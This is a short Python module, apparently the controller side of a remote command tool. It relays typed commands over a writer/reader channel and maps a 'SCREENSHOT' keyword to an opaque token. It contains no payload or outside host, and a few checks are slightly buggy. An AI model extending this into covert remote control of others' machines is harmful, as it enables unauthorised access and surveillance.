from Tools.toolsF import getJsonKey

class Actions(object):
    
    def __init__(self):
        self.commandsScope = {
            'SCREENSHOT': "7d6ac94326613ed825f540c02"
        }
        self.screenshot = False
        self.wasFiltered = False

    
    def _getfilterd(self, command:str) -> str:
        return self.commandsScope.get(command, command), command
        
    def getCommand(self,command:str) -> str:
        command, key = self._getfilterd(command)
        self.wasFiltered = command == key
        self._resetor(key)
        return command

    def _resetor(self,key):
        self.screenshot = key == 'SCREENSHOT'


class CommandManager(object):

    def __init__(self,writer, reader):
        self.writer = writer
        self.reader = reader
        self.ActionsScope = Actions()
        self.waitingForResult = False
        self.image = None

    def retriveCommand(self, command:str) -> str:
        self.waitingForResult = command is not None
        command = self.filterCommand(command.strip())
        print(command)
        self.writer(command.encode())
        return self.reader().decode(errors='replace')
    
    def filterCommand(self,command:str) -> str:
        return self.ActionsScope.getCommand(command)
        

            
